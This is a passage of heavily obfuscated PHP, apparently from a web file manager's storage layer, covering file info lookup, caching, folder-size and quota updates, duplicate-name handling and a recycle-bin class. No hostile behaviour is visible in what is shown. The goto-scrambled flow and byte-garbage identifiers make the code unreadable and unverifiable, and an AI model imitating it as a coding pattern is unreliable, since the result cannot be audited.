{ return $e¥ù®í‹”‡[33]; } return IO::getContent($F„¶½…›ø©[$e¥ù®í‹”‡[75]]); goto E¾¨¿³Õ‹è; dãÔã¡«®¨: if ($F„¶½…›ø©[$e¥ù®í‹”‡[77]] == 0) { return $e¥ù®í‹”‡[33]; } $F¿—†ÚÔ¹‘ = $e¥ù®í‹”‡[1922] . $F„¶½…›ø©[$e¥ù®í‹”‡[169]]; if ($F„¶½…›ø©[$e¥ù®í‹”‡[77]] <= 1024 * 10) { $f®ß•ò†í  = Cache::get($F¿—†ÚÔ¹‘); if (!$f®ß•ò†í ) { $f®ß•ò†í  = IO::getContent($F„¶½…›ø©[$e¥ù®í‹”‡[75]]); Cache::set($F¿—†ÚÔ¹‘, $f®ß•ò†í ); } return $f®ß•ò†í ; } goto a™óé‚î“Ï; E¾¨¿³Õ‹è: } public function setDesc($f÷â‹¦•¦Ÿ, $E¶¦ÄéëÆ¶) { $A’›ö“áÏ° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; Model($A’›ö“áÏ°[522])->eventAddDesc($f÷â‹¦•¦Ÿ, $E¶¦ÄéëÆ¶); return $this->metaSet($f÷â‹¦•¦Ÿ, $A’›ö“áÏ°[422], $E¶¦ÄéëÆ¶); } public function setContent($Aç¹½ÆôïÙ, $bâ¦ñÑˆ  = '') { goto dêÍßêù; dêÍßêù: $E­Æ…ï¦‚Ş =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÃµ­‹Æ¶ = $this->sourceInfo($Aç¹½ÆôïÙ); $Eâ¼æç•…‘ = $this->fileInfoGet($Aç¹½ÆôïÙ); goto aà¥Œƒ×š; EÓÕÃòæ£ë: if (!$CÏÅ®”ƒÎĞ) { return Model($E­Æ…ï¦‚Ş[439])->remove($E„²ÜîÄÀî[$E­Æ…ï¦‚Ş[436]]); } $this->folderSizeReset($aÃµ­‹Æ¶[$E­Æ…ï¦‚Ş[479]]); return !0; goto aÆ³¶àó—¾; aà¥Œƒ×š: if (!$Eâ¼æç•…‘ || !$aÃµ­‹Æ¶) { return !1; } $E„²ÜîÄÀî = Model($E­Æ…ï¦‚Ş[439])->addFileByContent($bâ¦ñÑˆ , $aÃµ­‹Æ¶[$E­Æ…ï¦‚Ş[28]]); $CÏÅ®”ƒÎĞ = $this->fileHistory($aÃµ­‹Æ¶, $E„²ÜîÄÀî[$E­Æ…ï¦‚Ş[436]], $E„²ÜîÄÀî[$E­Æ…ï¦‚Ş[77]]); goto EÓÕÃòæ£ë; aÆ³¶àó—¾: } public function fileSubstr($fâÓ†ãÇ , $Bè¡™ï­Á, $DĞ™³“İßÈ) { $fá²ñßŠÍí = $this->fileInfoGet($fâÓ†ãÇ ); if (!$fá²ñßŠÍí) { return !1; } return IO::fileSubstr($fá²ñßŠÍí[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]], $Bè¡™ï­Á, $DĞ™³“İßÈ); } public function fileInfoGet($DÆãÏ —‘) { goto C£¹‘ö™î; e¨•¶ùºÜÒ: $f™µ³„šºÀ = $D®Õ¤Šˆêƒ[442] . $DºÉ²àß[$D®Õ¤Šˆêƒ[436]]; $döÆ’¨³¯¥ = _get(self::$cacheFileInfo, $f™µ³„šºÀ); if ($döÆ’¨³¯¥) { return $döÆ’¨³¯¥; } goto aÒ²£ê‚ø–; C¿¯¾•™ÆÃ: return $B­Âß¾¾Úâ; goto FèÊĞŞƒŞµ; aÒ²£ê‚ø–: $B­Âß¾¾Úâ = Model($D®Õ¤Šˆêƒ[439])->fileInfo($DºÉ²àß[$D®Õ¤Šˆêƒ[436]]); if ($B­Âß¾¾Úâ) { $B­Âß¾¾Úâ[$D®Õ¤Šˆêƒ[28]] = $DºÉ²àß[$D®Õ¤Šˆêƒ[28]]; } self::$cacheFileInfo[$f™µ³„šºÀ] = $B­Âß¾¾Úâ; goto C¿¯¾•™ÆÃ; C£¹‘ö™î: $D®Õ¤Šˆêƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DºÉ²àß = $this->sourceInfo($DÆãÏ —‘); if (!$DºÉ²àß || $DºÉ²àß[$D®Õ¤Šˆêƒ[388]]) { return !1; } goto e¨•¶ùºÜÒ; FèÊĞŞƒŞµ: } private function folderChildrenNumber($AÅùÍŞ¤õÆ) { $Bš¶›ê—ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‹ŞÀ·ùØ = $this->sourceInfo($AÅùÍŞ¤õÆ); $C³î´’·¶ò = array($Bš¶›ê—ö[542] => array($Bš¶›ê—ö[501], $A‹ŞÀ·ùØ[$Bš¶›ê—ö[477]] . $AÅùÍŞ¤õÆ . $Bš¶›ê—ö[502]), $Bš¶›ê—ö[413] => intval($A‹ŞÀ·ùØ[$Bš¶›ê—ö[414]]), $Bš¶›ê—ö[535] => 1); $C–÷»áÒóé = $this->where($C³î´’·¶ò)->count(); $aõºè«”Áë = $this->where($C³î´’·¶ò)->where(array($Bš¶›ê—ö[535] => 0))->count(); return array($Bš¶›ê—ö[81] => $aõºè«”Áë, $Bš¶›ê—ö[82] => $C–÷»áÒóé); } public function pathInfo($eÅ‡Ñßé¤¨, $fíÉ‚ìÓ´¶ = false) { goto D–ëÒôÙƒŞ; E±Ê¿—æ§: $c‡Œò‡ ¬„ = $e´šçˆ[428] . intval($fíÉ‚ìÓ´¶) . $e´šçˆ[429] . $eÅ‡Ñßé¤¨; $aŸ–«ÕµÑ© = _get(self::$cachePathInfo, $c‡Œò‡ ¬„); if ($aŸ–«ÕµÑ©) { return $aŸ–«ÕµÑ©; } goto b§’‚ßÁà; b§’‚ßÁà: $c»”¯¿¾§æ = $this->sourceInfo($eÅ‡Ñßé¤¨); if (!$c»”¯¿¾§æ) { return !1; } $c»”¯¿¾§æ = $this->_listDataApplyItem($c»”¯¿¾§æ, $fíÉ‚ìÓ´¶); goto c¯ƒ¿Şó¹õ; D–ëÒôÙƒŞ: $e´šçˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fíÉ‚ìÓ´¶ = !1; $eÅ‡Ñßé¤¨ = intval($eÅ‡Ñßé¤¨); goto E±Ê¿—æ§; c¯ƒ¿Şó¹õ: self::$cachePathInfo[$c‡Œò‡ ¬„] = $c»”¯¿¾§æ; return $c»”¯¿¾§æ; goto aÑŒÛ°¯›³; aÑŒÛ°¯›³: } public static $cachePathInfoMore = array(); public function pathInfoMore($bä¢ÀÙ) { goto E‘ğ…îó‰²; E‘ğ…îó‰²: $f§„·É­Ù½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÁ¢ğÉ˜¡­ = _get(self::$cachePathInfoMore, $bä¢ÀÙ); if ($fÁ¢ğÉ˜¡­) { return $fÁ¢ğÉ˜¡­; } goto FÈÇÌåÁƒ§; FÈÇÌåÁƒ§: $FêêÜ¿†à = $this->pathInfo($bä¢ÀÙ); if (!$FêêÜ¿†à) { return !1; } if ($FêêÜ¿†à[$f§„·É­Ù½[388]] == $f§„·É­Ù½[86]) { $FêêÜ¿†à[$f§„·É­Ù½[80]] = $this->folderChildrenNumber($bä¢ÀÙ); } goto CéîîíßñÙ; CéîîíßñÙ: self::$cachePathInfoMore[$bä¢ÀÙ] = $FêêÜ¿†à; return $FêêÜ¿†à; goto cÄ„¦½Ï¥“; cÄ„¦½Ï¥“: } public function sourceInfo($CİÌÙÜ‹ã¶) { goto DˆÔ»«í¦; eÇŠ«õÜ˜: $Dæ®ÌÆêŒ« = $d»°Ãîß¾š[427] . $CİÌÙÜ‹ã¶; $AËæ„Ø›õÓ = _get(self::$cacheSourceInfo, $Dæ®ÌÆêŒ«); if ($AËæ„Ø›õÓ) { return $AËæ„Ø›õÓ; } goto a‘¢Ş§ñÎ·; a‘¢Ş§ñÎ·: $e¨ê‰ç†¥÷ = $this->where(array($d»°Ãîß¾š[387] => $CİÌÙÜ‹ã¶))->find(); self::$cacheSourceInfo[$Dæ®ÌÆêŒ«] = $e¨ê‰ç†¥÷; return self::$cacheSourceInfo[$Dæ®ÌÆêŒ«]; goto eÓ‘¢†­¨µ; DˆÔ»«í¦: $d»°Ãîß¾š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$CİÌÙÜ‹ã¶) { return array(); } $CİÌÙÜ‹ã¶ = intval($CİÌÙÜ‹ã¶); goto eÇŠ«õÜ˜; eÓ‘¢†­¨µ: } public function sourceCacheClear($Bö÷¯À¢¤… = false) { self::cacheClear($Bö÷¯À¢¤…); } public static function cacheClear($càâ»ˆÂ•” = false) { $Cõ”˜Íø„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($càâ»ˆÂ•” == !1) { goto BÔ²ØÚ÷…’; BÔ²ØÚ÷…’: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto A÷µÒ©çÆš; Dæ¨–¶Â›»: return; goto Aˆ’†í§‘Æ; A÷µÒ©çÆš: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto Dæ¨–¶Â›»; Aˆ’†í§‘Æ: } unset(self::$cacheSourceInfo[$Cõ”˜Íø„[427] . $càâ»ˆÂ•”]); unset(self::$cachePathInfoMore[$càâ»ˆÂ•”]); unset(self::$cachePathInfo[$Cõ”˜Íø„[1923] . $càâ»ˆÂ•”]); unset(self::$cachePathInfo[$Cõ”˜Íø„[1924] . $càâ»ˆÂ•”]); } public function metaSet($dê´µõ‚®ƒ, $d³¶‚Äƒßƒ = null, $bÑää–Ñ£ö = null) { $dè¬åáƒ» = parent::metaSet($dê´µõ‚®ƒ, $d³¶‚Äƒßƒ, $bÑää–Ñ£ö); if ($dè¬åáƒ») { $this->sourceCacheClear($dê´µõ‚®ƒ); } return $dè¬åáƒ»; } public function pathInfoByPath($F¸’’İ‹¾Š, $D‚µ¢è›Èñ) { $AÇêÃ›ĞØ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bä¸†÷¸·¸ = !$D‚µ¢è›Èñ ? array() : explode($AÇêÃ›ĞØ[8], trim($D‚µ¢è›Èñ, $AÇêÃ›ĞØ[8])); $Bö¾›—åÁ = $F¸’’İ‹¾Š; foreach ($bä¸†÷¸·¸ as $a¹Í‰›­±„) { $d®°§¢Ìá¹ = array($AÇêÃ›ĞØ[479] => $Bö¾›—åÁ, $AÇêÃ›ĞØ[28] => $a¹Í‰›­±„); $EØœäÊ¿“æ = $this->where($d®°§¢Ìá¹)->select(); if (!$EØœäÊ¿“æ) { return !1; } $EØœäÊ¿“æ = array_sort_by($EØœäÊ¿“æ, $AÇêÃ›ĞØ[414]); $Bö¾›—åÁ = $EØœäÊ¿“æ[0][$AÇêÃ›ĞØ[387]]; } return $this->pathInfo($Bö¾›—åÁ, !0); } protected function updateModifyTime($fäÆŞŸÃå¸) { goto DÍ¡Û•Ø¤; DÍ¡Û•Ø¤: $B•ÉÔºÍñÕ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$fäÆŞŸÃå¸) { return; } if (!is_array($fäÆŞŸÃå¸)) { $fäÆŞŸÃå¸ = array($fäÆŞŸÃå¸); } goto aííŞ‰ˆ•î; f¦âÎ–‹òä: $this->where($AÀ½¡å«½Ğ)->save($c‡¹¿³®ø); goto Eæ¹†Š»ê; aííŞ‰ˆ•î: foreach ($fäÆŞŸÃå¸ as $EÕ¶¡ãâ» => $A‹Ü¬—ç¼¹) { $fäÆŞŸÃå¸[$EÕ¶¡ãâ»] = intval($A‹Ü¬—ç¼¹); $this->sourceCacheClear($A‹Ü¬—ç¼¹); } $AÀ½¡å«½Ğ = array($B•ÉÔºÍñÕ[387] => array($B•ÉÔºÍñÕ[7], $fäÆŞŸÃå¸)); $c‡¹¿³®ø = array($B•ÉÔºÍñÕ[541] => USER_ID, $B•ÉÔºÍñÕ[408] => time()); goto f¦âÎ–‹òä; Eæ¹†Š»ê: } public function folderSizeReset($EÆ’íƒÓâ, $A©­ª«â£× = false) { goto EƒÜÈâß¢; e·ã÷…åùÒ: $cë¸ºƒÔ°‡[] = $eˆˆ›‘å¦[$A‹Ş¨…ˆå[387]]; $Dƒ¿§ÜÁº… = array($A‹Ş¨…ˆå[387] => array($A‹Ş¨…ˆå[402], $cë¸ºƒÔ°‡)); if ($A©­ª«â£× < 0) { $Dƒ¿§ÜÁº…[$A‹Ş¨…ˆå[77]] = array($A‹Ş¨…ˆå[924], abs($A©­ª«â£×)); } goto E¤ç¿“ğºÛ; EƒÜÈâß¢: $A‹Ş¨…ˆå =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->statusIgnoreResetSpace) { return; } $eˆˆ›‘å¦ = $this->sourceInfo($EÆ’íƒÓâ); goto a±ŠºïÀ‹; E¤ç¿“ğºÛ: $this->where($Dƒ¿§ÜÁº…)->setAdd($A‹Ş¨…ˆå[77], $A©­ª«â£×); CacheLock::unlock($eÒ‚Î—²––); $this->targetSpaceUpdate($eˆˆ›‘å¦[$A‹Ş¨…ˆå[389]], $eˆˆ›‘å¦[$A‹Ş¨…ˆå[474]]); goto B†Ù½•„²; EÀ¾‰šÏ: if ($A©­ª«â£× == 0) { return CacheLock::unlock($eÒ‚Î—²––); } $cë¸ºƒÔ°‡ = $this->parentLevelArray($eˆˆ›‘å¦[$A‹Ş¨…ˆå[477]]); if (!$cë¸ºƒÔ°‡) { $cë¸ºƒÔ°‡ = array(); } goto e·ã÷…åùÒ; a±ŠºïÀ‹: $eÒ‚Î—²–– = $A‹Ş¨…ˆå[1925] . $EÆ’íƒÓâ; CacheLock::lock($eÒ‚Î—²––, 20); if ($A©­ª«â£× === !1) { $this->sourceCacheClear($EÆ’íƒÓâ); $eˆˆ›‘å¦ = $this->sourceInfo($EÆ’íƒÓâ); $Dƒ¿§ÜÁº… = array($A‹Ş¨…ˆå[386] => $EÆ’íƒÓâ, $A‹Ş¨…ˆå[413] => 0); $då¡½·èç· = $this->where($Dƒ¿§ÜÁº…)->sum($A‹Ş¨…ˆå[77]); $A©­ª«â£× = intval($då¡½·èç·) - intval($eˆˆ›‘å¦[$A‹Ş¨…ˆå[77]]); } goto EÀ¾‰šÏ; B†Ù½•„²: } public function folderSizeResetChildren($Aš²ğ¾È) { goto dñ¡¾§­; C¿õ’ï•º: $a„ÕÚŸ‘ä[$f†…¢©â‹Œ[388]] = 0; $DìÚ¹Ú»­¯ = $this->field($Bµ¾Ç·ĞÇ™)->where($a„ÕÚŸ‘ä)->select(); if (!$DìÚ¹Ú»­¯) { return; } goto Bä–ÁôŒµ ; B…¬÷åöŠï: $a„ÕÚŸ‘ä = array($f†…¢©â‹Œ[535] => 1, $f†…¢©â‹Œ[542] => array($f†…¢©â‹Œ[501], $a°Û‘ˆáãŒ[$f†…¢©â‹Œ[477]] . $Aš²ğ¾È . $f†…¢©â‹Œ[502])); $Bµ¾Ç·ĞÇ™ = $f†…¢©â‹Œ[1926]; $bÒÚ³èĞ…Û = $this->field($Bµ¾Ç·ĞÇ™)->where($a„ÕÚŸ‘ä)->select(); goto C¿õ’ï•º; Bä–ÁôŒµ : $bÒÚ³èĞ…Û[] = $a°Û‘ˆáãŒ; $bÒÚ³èĞ…Û = array_to_keyvalue($bÒÚ³èĞ…Û, $f†…¢©â‹Œ[387]); foreach ($bÒÚ³èĞ…Û as $Aæó‘ó–Š‰ => $C¼‚Â³‘) { $bÒÚ³èĞ…Û[$Aæó‘ó–Š‰][$f†…¢©â‹Œ[1927]] = $bÒÚ³èĞ…Û[$Aæó‘ó–Š‰][$f†…¢©â‹Œ[77]]; $bÒÚ³èĞ…Û[$Aæó‘ó–Š‰][$f†…¢©â‹Œ[77]] = 0; } goto e¢œœˆğ§æ; dñ¡¾§­: $f†…¢©â‹Œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->sourceCacheClear($Aš²ğ¾È); $a°Û‘ˆáãŒ = $this->sourceInfo($Aš²ğ¾È); goto B…¬÷åöŠï; aÊ¼ôá†á©: foreach ($bÒÚ³èĞ…Û as $C¼‚Â³‘) { if ($C¼‚Â³‘[$f†…¢©â‹Œ[77]] == $C¼‚Â³‘[$f†…¢©â‹Œ[1927]]) { continue; } $côÀòËŠ‹¶[] = array($f†…¢©â‹Œ[387], $C¼‚Â³‘[$f†…¢©â‹Œ[387]], $f†…¢©â‹Œ[77], $C¼‚Â³‘[$f†…¢©â‹Œ[77]]); } $this->saveAll($côÀòËŠ‹¶); goto Cù­í‹í°­; e¢œœˆğ§æ: foreach ($DìÚ¹Ú»­¯ as $C¼‚Â³‘) { $F‘œ‰Œ±ê‡ = $C¼‚Â³‘[$f†…¢©â‹Œ[479]] . $f†…¢©â‹Œ[33]; if (!isset($bÒÚ³èĞ…Û[$F‘œ‰Œ±ê‡])) { continue; } if ($C¼‚Â³‘[$f†…¢©â‹Œ[414]] == $bÒÚ³èĞ…Û[$F‘œ‰Œ±ê‡][$f†…¢©â‹Œ[414]]) { $bÒÚ³èĞ…Û[$F‘œ‰Œ±ê‡][$f†…¢©â‹Œ[77]] += $C¼‚Â³‘[$f†…¢©â‹Œ[77]]; } } foreach ($bÒÚ³èĞ…Û as $C¼‚Â³‘) { $A£ôÜÜÜ¨½ = $this->parentLevelArray($C¼‚Â³‘[$f†…¢©â‹Œ[477]]); foreach ($A£ôÜÜÜ¨½ as $F‘œ‰Œ±ê‡) { $F‘œ‰Œ±ê‡ = $F‘œ‰Œ±ê‡ . $f†…¢©â‹Œ[33]; if (!isset($bÒÚ³èĞ…Û[$F‘œ‰Œ±ê‡])) { continue; } if ($C¼‚Â³‘[$f†…¢©â‹Œ[414]] == $bÒÚ³èĞ…Û[$F‘œ‰Œ±ê‡][$f†…¢©â‹Œ[414]]) { $bÒÚ³èĞ…Û[$F‘œ‰Œ±ê‡][$f†…¢©â‹Œ[77]] += $C¼‚Â³‘[$f†…¢©â‹Œ[77]]; } } } $côÀòËŠ‹¶ = array(); goto aÊ¼ôá†á©; Cù­í‹í°­: } public function userSpaceReset($DŠ×ëÂØÓ„ = false) { $CİÌË¤óéé =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¤Å¹“›ñÃ = $this->where(array($CİÌË¤óéé[389] => self::TYPE_USER, $CİÌË¤óéé[474] => $DŠ×ëÂØÓ„, $CİÌË¤óéé[388] => 0))->sum($CİÌË¤óéé[77]); Model($CİÌË¤óéé[492])->userEdit($DŠ×ëÂØÓ„, array($CİÌË¤óéé[1624] => $D¤Å¹“›ñÃ)); } public function targetSpaceUpdate($FïÎ²É‘¸â, $A‰Âˆë‹İ) { $CË³Š®á¤Ş =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$A‰Âˆë‹İ) { return; } if (!in_array($FïÎ²É‘¸â, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d‘ßËÖ”Ÿ§ = $this->targetSpaceSize($FïÎ²É‘¸â, $A‰Âˆë‹İ); if ($FïÎ²É‘¸â == self::TYPE_USER) { Model($CË³Š®á¤Ş[492])->userEdit($A‰Âˆë‹İ, array($CË³Š®á¤Ş[1624] => $d‘ßËÖ”Ÿ§)); } else { if ($FïÎ²É‘¸â == self::TYPE_GROUP) { Model($CË³Š®á¤Ş[476])->groupEdit($A‰Âˆë‹İ, array($CË³Š®á¤Ş[1624] => $d‘ßËÖ”Ÿ§)); } } } public function targetSpaceSize($e²ĞÒªïÔ, $Cİ¦î¨ÒÃó) { goto cÛ§§Ÿî–Û; aÖà’×ÈÄ—: $E•áçóòŸ = array_to_keyvalue($E•áçóòŸ, $E§‡ñÀ‹„[33], $E§‡ñÀ‹„[387]); $E•áçóòŸ = array_unique(array_filter($E•áçóòŸ)); if ($E•áçóòŸ) { $bàæƒ¬Í„¿ = array($E§‡ñÀ‹„[401] => array($E§‡ñÀ‹„[402], $E•áçóòŸ)); $A™Ş¤¹Åè¼ += floatval($this->where($bàæƒ¬Í„¿)->sum($E§‡ñÀ‹„[77])); } goto F²¡æÅÁÛÊ; cÛ§§Ÿî–Û: $E§‡ñÀ‹„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eëˆ¾Ï˜ô = $this->sourceRoot($e²ĞÒªïÔ, $Cİ¦î¨ÒÃó, !0); if (!$Eëˆ¾Ï˜ô) { return 0; } goto A‹¢ˆƒÚƒé; A‹¢ˆƒÚƒé: $A™Ş¤¹Åè¼ = floatval($Eëˆ¾Ï˜ô[$E§‡ñÀ‹„[77]]); $bàæƒ¬Í„¿ = array($E§‡ñÀ‹„[542] => array($E§‡ñÀ‹„[501], $E§‡ñÀ‹„[488] . $Eëˆ¾Ï˜ô[$E§‡ñÀ‹„[387]] . $E§‡ñÀ‹„[502])); $E•áçóòŸ = Model($E§‡ñÀ‹„[412])->field($E§‡ñÀ‹„[401])->where($bàæƒ¬Í„¿)->select(); goto aÖà’×ÈÄ—; F²¡æÅÁÛÊ: return $A™Ş¤¹Åè¼; goto Föß„Ÿ’; Föß„Ÿ’: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($f¿Ÿ°˜ä¯í) { return $this->fileTypeProfile($f¿Ÿ°˜ä¯í, SourceModel::TYPE_USER); } public function groupFileTypeProfile($B¨Ê““¥ï) { return $this->fileTypeProfile($B¨Ê““¥ï, SourceModel::TYPE_GROUP); } private function fileTypeProfile($a’”¸¯öÊ£, $dÍÈÍî» Ê) { goto E‹…¶ëŠØä; e¯†ßßÔ®Ü: $f‚Ìö×´¢ = array(); $f‚Ìö×´¢[$F»¸„•æ·ç[1929]] = array($F»¸„•æ·ç[1930] => LNG($F»¸„•æ·ç[1929]), $F»¸„•æ·ç[1931] => $this->where($E”Êä’Ğ¡ù)->count(), $F»¸„•æ·ç[537] => $this->where($E”Êä’Ğ¡ù)->sum($F»¸„•æ·ç[77])); $D¿™«’Ë˜Ï = KodIO::fileTypeList(); goto dÖó±æİ‰¡; E‹…¶ëŠØä: $F»¸„•æ·ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F®Ú˜á¬ñÀ = $F»¸„•æ·ç[1928] . $a’”¸¯öÊ£ . $F»¸„•æ·ç[70] . $dÍÈÍî» Ê; $A‰æ°ƒä–Ÿ = Cache::get($F®Ú˜á¬ñÀ); goto b¬ííéí­Œ; dÖó±æİ‰¡: foreach ($D¿™«’Ë˜Ï as $b£¥ƒ«ë¢ => $d÷ÜÕÚÚ¿) { $E”Êä’Ğ¡ù[$F»¸„•æ·ç[390]] = $this->fileTypeWhere($b£¥ƒ«ë¢); $f‚Ìö×´¢[$b£¥ƒ«ë¢] = array($F»¸„•æ·ç[1930] => $d÷ÜÕÚÚ¿[$F»¸„•æ·ç[28]], $F»¸„•æ·ç[1931] => $this->where($E”Êä’Ğ¡ù)->count(), $F»¸„•æ·ç[537] => $this->where($E”Êä’Ğ¡ù)->sum($F»¸„•æ·ç[77])); } Cache::set($F®Ú˜á¬ñÀ, $f‚Ìö×´¢, 1200); return $f‚Ìö×´¢; goto f±Ñ²ä´¤ì; b¬ííéí­Œ: if ($A‰æ°ƒä–Ÿ) { return $A‰æ°ƒä–Ÿ; } $E”Êä’Ğ¡ù = array($F»¸„•æ·ç[535] => 0); if ($a’”¸¯öÊ£ != !1) { $E”Êä’Ğ¡ù[$F»¸„•æ·ç[474]] = $a’”¸¯öÊ£; $E”Êä’Ğ¡ù[$F»¸„•æ·ç[389]] = $dÍÈÍî» Ê; } goto e¯†ßßÔ®Ü; f±Ñ²ä´¤ì: } public function fileNameExist($CÁ®†ŞŒã, $d©ÒìÒÚÛ›) { $d ÏåšĞ² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cù§ÊÍ‡ÎÙ = $this->childList($CÁ®†ŞŒã); foreach ($Cù§ÊÍ‡ÎÙ as $E¯Ú†ªÖõ) { if ($E¯Ú†ªÖõ[$d ÏåšĞ²[28]] == $d©ÒìÒÚÛ›) { return $E¯Ú†ªÖõ[$d ÏåšĞ²[387]]; } if (strtolower($E¯Ú†ªÖõ[$d ÏåšĞ²[28]]) == strtolower($d©ÒìÒÚÛ›)) { return $E¯Ú†ªÖõ[$d ÏåšĞ²[387]]; } } return !1; } public function childList($eõØ¡¤Õ¼²) { goto A˜Åˆì™×; BôÙ·Ò…Ö: self::$cacheChildList[$DÀÑç½¯ù”] = $aÊ–ë’ÈÏ‰; foreach ($aÊ–ë’ÈÏ‰ as $cèêÀàš¡) { $DÀÑç½¯ù” = $Eğ“Á”¶òß[427] . $cèêÀàš¡[$Eğ“Á”¶òß[387]]; self::$cacheSourceInfo[$DÀÑç½¯ù”] = $cèêÀàš¡; } return $aÊ–ë’ÈÏ‰; goto aèê¥ÛÚŠË; AÄáé˜¦½Ä: $Aä›ç¡ˆÁŞ = array($Eğ“Á”¶òß[479] => intval($eõØ¡¤Õ¼²), $Eğ“Á”¶òß[414] => 0); $aÊ–ë’ÈÏ‰ = $this->where($Aä›ç¡ˆÁŞ)->select(); $aÊ–ë’ÈÏ‰ = $aÊ–ë’ÈÏ‰ ? $aÊ–ë’ÈÏ‰ : array(); goto BôÙ·Ò…Ö; A˜Åˆì™×: $Eğ“Á”¶òß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÀÑç½¯ù” = $Eğ“Á”¶òß[1908] . $eõØ¡¤Õ¼²; if (isset(self::$cacheChildList[$DÀÑç½¯ù”])) { return self::$cacheChildList[$DÀÑç½¯ù”]; } goto AÄáé˜¦½Ä; aèê¥ÛÚŠË: } public function fileNameAuto($cˆ¥åğŒÀ½, $dªòçÕ‘Òæ, $f·ôÂß¦á½ = REPEAT_RENAME, $F¢µ²è»Ÿ¡ = false) { $c¨–ò‰ßíÆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¤ÚÇ¬ÄÉ = $this->childList($cˆ¥åğŒÀ½); $AÎƒŸåš• = array_to_keyvalue($c¤ÚÇ¬ÄÉ, $c¨–ò‰ßíÆ[33], $c¨–ò‰ßíÆ[28]); return $this->fileNameAutoGet($AÎƒŸåš•, $dªòçÕ‘Òæ, $f·ôÂß¦á½, $F¢µ²è»Ÿ¡); } public function fileNameAutoGet($dìöšº„òé, $fÄ”Ü±ëÆÊ, $F§ˆöÁğŸ—, $Fè¦§ŒØ‹”) { $f•°²ì…÷‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($F§ˆöÁğŸ— == REPEAT_REPLACE || !$dìöšº„òé || !in_array_not_case($fÄ”Ü±ëÆÊ, $dìöšº„òé) || $Fè¦§ŒØ‹” && $F§ˆöÁğŸ— != REPEAT_RENAME_FOLDER) { return $fÄ”Ü±ëÆÊ; } if ($F§ˆöÁğŸ— == REPEAT_SKIP) { return !1; } $CŒš­ø¹ = $f•°²ì…÷‹[94] . get_path_ext($fÄ”Ü±ëÆÊ); $CŒš­ø¹ = $CŒš­ø¹ == $f•°²ì…÷‹[94] || $Fè¦§ŒØ‹” ? $f•°²ì…÷‹[33] : $CŒš­ø¹; for ($b«ò­Ã‘·İ = 1; $b«ò­Ã‘·İ <= count($dìöšº„òé) + 1; $b«ò­Ã‘·İ++) { $F¥½Öå©Ø = substr($fÄ”Ü±ëÆÊ, 0, strlen($fÄ”Ü±ëÆÊ) - strlen($CŒš­ø¹)); $cÖƒ±ÚËéÊ = $F¥½Öå©Ø . "\50{$b«ò­Ã‘·İ}\x29{$CŒš­ø¹}"; if (!in_array_not_case($cÖƒ±ÚËéÊ, $dìöšº„òé)) { return $cÖƒ±ÚËéÊ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\145\x5f\162\x65\143\x79\143\154\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\x54\151\155\x65", "\164\151\155\145", "\151\156\x73\145\162\x74", "\x66\165\156\143\164\151\x6f\x6e")); public function listData($d‹ƒæ¾‹º = false) { $bÆªÕ¢›ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d‹ƒæ¾‹º = $d‹ƒæ¾‹º ? $d‹ƒæ¾‹º : USER_ID; $bªÊœ›ööí = $this->where(array($bÆªÕ¢›ç[1471] => $d‹ƒæ¾‹º))->select(); return array_to_keyvalue($bªÊœ›ööí, $bÆªÕ¢›ç[33], $bÆªÕ¢›ç[387]); } public function moveToRecycle($AùÒàÊ÷Üó) { goto A À£·ŠÂĞ; DŞ›ƒÜæâ¼: $this->recycleMove($AùÒàÊ÷Üó, 1); if ($aİç«÷ñ…µ[$EÒÀŒÛ§‰Ò[388]] == $EÒÀŒÛ§‰Ò[86]) { $FÛô‰©¶¼¤ = array($EÒÀŒÛ§‰Ò[542] => array($EÒÀŒÛ§‰Ò[501], $aİç«÷ñ…µ[$EÒÀŒÛ§‰Ò[477]] . $AùÒàÊ÷Üó . $EÒÀŒÛ§‰Ò[502])); $FôîÕ¡…ÊÌ->where($FÛô‰©¶¼¤)->setField($EÒÀŒÛ§‰Ò[414], 1); } goto bì®²óºË´; cÈ£áğ»×—: if (!$aİç«÷ñ…µ || $aİç«÷ñ…µ[$EÒÀŒÛ§‰Ò[414]] == $EÒÀŒÛ§‰Ò[86]) { return; } $FÊ«ˆµ·Ù… = array($EÒÀŒÛ§‰Ò[401] => $AùÒàÊ÷Üó, $EÒÀŒÛ§‰Ò[1471] => USER_ID, $EÒÀŒÛ§‰Ò[538] => $aİç«÷ñ…µ[$EÒÀŒÛ§‰Ò[389]], $EÒÀŒÛ§‰Ò[539] => $aİç«÷ñ…µ[$EÒÀŒÛ§‰Ò[474]], $EÒÀŒÛ§‰Ò[542] => $aİç«÷ñ…µ[$EÒÀŒÛ§‰Ò[477]]); $this->add($FÊ«ˆµ·Ù…); goto DŞ›ƒÜæâ¼; A À£·ŠÂĞ: $EÒÀŒÛ§‰Ò 